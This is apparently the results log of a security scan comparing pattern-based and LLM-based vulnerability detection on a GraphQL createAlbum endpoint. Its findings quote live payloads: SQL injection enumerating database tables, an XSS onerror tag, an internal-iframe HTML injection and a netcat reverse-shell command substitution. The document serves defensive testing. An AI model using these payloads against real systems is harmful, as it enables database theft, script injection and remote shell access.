timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-05T14:17:34.712062,createAlbum_response_2,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]","[{""detection_name"": ""LLM: sql_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a SQL injection payload in the 'title' field (1' UNION SELECT null,table_name FROM information_schema.tables--). This payload attempts to query the information_schema.tables metadata table, indicating database schema enumeration. The successful 200 response suggests the payload was executed by the backend database, exposing structural database information. This is a clear indicator of insufficient input sanitization and direct SQL query interpolation in GraphQL operations."", ""evidence"": ""title: \""1' UNION SELECT null,table_name FROM information_schema.tables--\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""sql_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""title: \""1' UNION SELECT null,table_name FROM information_schema.tables--\"""", ""explanation"": ""The response contains a SQL injection payload in the 'title' field (1' UNION SELECT null,table_name FROM information_schema.tables--). This payload attempts to query the information_schema.tables metadata table, indicating database schema enumeration. The successful 200 response suggests the payload was executed by the backend database, exposing structural database information. This is a clear indicator of insufficient input sanitization and direct SQL query interpolation in GraphQL operations.""}}]"
2025-10-05T14:17:41.701995,createAlbum_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a title field with an HTML payload (`<img src=x onerror=alert(document.domain)>`). This payload uses an `<img>` tag with an `onerror` JavaScript event handler, which would execute arbitrary code if rendered unsanitized in a browser. This indicates a stored XSS vulnerability if this payload is persisted and displayed to other users, or reflected XSS if echoed directly in a response. The presence of HTML/script content in user-controlled fields strongly suggests insufficient input sanitization or output encoding."", ""evidence"": ""\""title\"": \""<img src=x onerror=alert(document.domain)>\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""\""title\"": \""<img src=x onerror=alert(document.domain)>\"""", ""explanation"": ""The response contains a title field with an HTML payload (`<img src=x onerror=alert(document.domain)>`). This payload uses an `<img>` tag with an `onerror` JavaScript event handler, which would execute arbitrary code if rendered unsanitized in a browser. This indicates a stored XSS vulnerability if this payload is persisted and displayed to other users, or reflected XSS if echoed directly in a response. The presence of HTML/script content in user-controlled fields strongly suggests insufficient input sanitization or output encoding.""}}]"
2025-10-05T14:17:47.906277,createAlbum_response_4,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T14:17:57.541832,createAlbum_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The payload '$(nc -nv 127.0.0.1 4444)' in the title field indicates attempted command injection via shell command substitution. The use of $() syntax suggests the input may be executed in a shell context, potentially allowing arbitrary command execution if the server processes this input unsafely in system commands. The netcat (nc) payload specifically attempts to establish a reverse shell connection to localhost port 4444, demonstrating clear malicious intent."", ""evidence"": ""Title contains 'malicious$(nc -nv 127.0.0.1 4444)' with shell command substitution syntax"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""Title contains 'malicious$(nc -nv 127.0.0.1 4444)' with shell command substitution syntax"", ""explanation"": ""The payload '$(nc -nv 127.0.0.1 4444)' in the title field indicates attempted command injection via shell command substitution. The use of $() syntax suggests the input may be executed in a shell context, potentially allowing arbitrary command execution if the server processes this input unsafely in system commands. The netcat (nc) payload specifically attempts to establish a reverse shell connection to localhost port 4444, demonstrating clear malicious intent.""}}]"
2025-10-05T14:18:05.561498,createAlbum_response_6,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T14:18:12.010620,createAlbum_response_7,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""HTML Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""HTML injection vulnerability detected - HTML markup found in response"", ""evidence"": ""Response status: 200, HTML patterns detected in response data""}]","[{""detection_name"": ""LLM: html_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains unsanitized HTML tags (`<h1>` and `<iframe>`) in the `title` field, indicating potential HTML injection. If this value is rendered in a client/browser without proper escaping, it could enable arbitrary content injection or UI manipulation. The `<iframe>` pointing to an internal resource (`internal.site.local`) also raises SSRF concerns, but the primary finding here is HTML injection."", ""evidence"": ""<h1>Private Data</h1><iframe src='internal.site.local'>"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""HIGH"", ""confidence"": 0.9, ""evidence"": ""<h1>Private Data</h1><iframe src='internal.site.local'>"", ""explanation"": ""The response contains unsanitized HTML tags (`<h1>` and `<iframe>`) in the `title` field, indicating potential HTML injection. If this value is rendered in a client/browser without proper escaping, it could enable arbitrary content injection or UI manipulation. The `<iframe>` pointing to an internal resource (`internal.site.local`) also raises SSRF concerns, but the primary finding here is HTML injection.""}}]"
2025-10-05T14:19:16.883868,createAlbum_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T14:19:39.097702,createAlbum_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T14:20:06.641465,createAlbum_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T14:20:57.932863,createAlbum_response_11,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
